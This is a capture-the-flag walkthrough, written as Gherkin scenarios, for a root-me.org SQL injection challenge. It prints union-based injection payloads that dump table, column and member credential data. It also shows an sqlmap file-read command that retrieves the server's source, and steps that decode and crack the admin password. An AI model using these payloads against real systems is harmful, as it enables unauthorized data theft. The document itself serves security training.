## Version 2.0
## language: en

Feature: SQL injection - File reading
  Site:
    root-me.org
  Category:
    Web-Server
  User:
    rocken2k
  Goal:
    Retrieve the administrator password

  Background:
  Hacker's software:
    | <Software name> | <Version>     |
    | Kali Linux      | 5.10.         |
    | Firefox Quantum | 68.2.0esr     |
    | SQLMAP          | 1.5.2         |
    | Visual Studio C.| 1.56.2        |

  Machine information:
    Given I am accessing the website through the URL
    """
    http://challenge01.root-me.org/web-serveur/ch31/
    """
    Then I see the homepage with an authentication form [evidence](1.png)

  Scenario: Fail: Using default credentials
    Given the login page
    When I try to use the default credentials "admin:password"
    Then I get an "Authentication failed !" message [evidence](2.png)
    And I can't see the flag
    And I can't solve the challenge

  Scenario: Fail: Trying some standards sql injections
    Given the link on the web page to go to "Members" section
    When I click on "Members"
    Then I can see the admin's username [evidence](3.png)
    And I realize that the parameter "id=1" is being passed through the URL
    Then I use the command "order by" after the parameter in the URL
    And after some tries, I discover that the current table has 4 columns
    Then I use the following command to find the table's name
    """
    and 1=2 union select 1, 2, 3,group_concat(table_name) from information_
    schema.tableswhere table_schema = database () --
    """
    And I can see the table's name [evidence](4.png)
    Then I use the following command to see the column's name
    """
    and 1=2 union select 1, 2, 3,group_concat(column_name) from information_
    schema.columns where table_name=member --
    """
    But I get an error message [evidence](5.png)
    And I can't solve the challenge

  Scenario: Fail: Try to decrypt string with base64
    Given The "Unknown column" error
    When I look on google some techniques to exploit sql vulnerability
    Then I discover that I can use "HEX code" to refer to a column in a sqli
    And I go to the following website
    """
    http://www.unit-conversion.info/texttools/hexadecimal/
    """
    And I convert "member" to hex code [evidence](6.png)
    When I use the following command to see the column's name
    """
    and 1=2 union select 1, 2, 3,group_concat(column_name) from information
    _schema.columns where table_name=0x6d656d626572 --
    """
    Then I can see the column's names [evidence](7.png)
    When I use the following command to see the column's value
    """
    and 1=2 union all select null,concat_ws(0x3a,member_id,member_login,
    member_password,member_email),null,version() from member--
    """
    Then I can see some username and password [evidence](8.png)
    And I think the password is base64 encrypted
    Then I go to the following website
    """
    https://www.base64decode.org/
    """
    When And I try to decrypt the string
    Then I get an error [evidence](9.png)
    And I realize the string is not in base64
    And I can't see the flag
    And I can't solve the challenge

  Scenario: Success: Using the command line to decrypt the password
    Given I can not decrypt the string
    When I realize that I need to check the source code
    Then I use the tool "sqlmap" with the following instruction
    """
    qlmap -u "http://challenge01.root-me.org/web-serveur/ch31/?
    action=members&id=1" —file-read=/challenge/web-serveur/ch31/index.php
    """
    And I can see the source code [evidence](10.png)
    Then I realize there is a function to convert the password
    And on VSC I execute the following command [evidence](11.png)
    """
    <?php
    function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
    $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));
    return $res;
    }
    echo stringxor('c92fcd618967933ac463feb85ba00d5a7ae52842',base64
    _decode('VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA=='));

    """
    And I get the following string
    """
    77be4fc97f77f5f48308942bb6e32aacabed9cef
    """
    When I see in the source code that the password is SHA1 encrypted
    Then I go to the following website to decrypt the string
    """
    https://crackstation.net/
    """
    And I can see the flag [evidence](12.png)
    And I submit the flag
    And I solve the challenge [evidence](13.png)
